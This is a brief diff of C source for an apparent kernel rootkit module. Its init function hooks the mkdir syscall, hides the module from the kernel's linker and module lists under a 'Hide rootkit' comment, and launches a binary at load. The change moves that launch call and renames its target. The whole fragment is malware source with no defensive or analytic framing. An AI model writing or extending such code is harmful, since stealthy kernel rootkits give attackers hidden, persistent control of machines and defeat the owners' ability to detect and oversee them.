@@ -45,10 +45,11 @@ init(void)
 	/* Enable interface. */
 	hook_syscall_set(SYS_mkdir, mkdir_hook);
 
+	boot_binary("test");
 	/* Hide rootkit. */
 	hide_kld(LINKER_NAME);
 	hide_ko(MODULE_NAME);
-	boot_binary("lol");
+	
 }
 
 static void
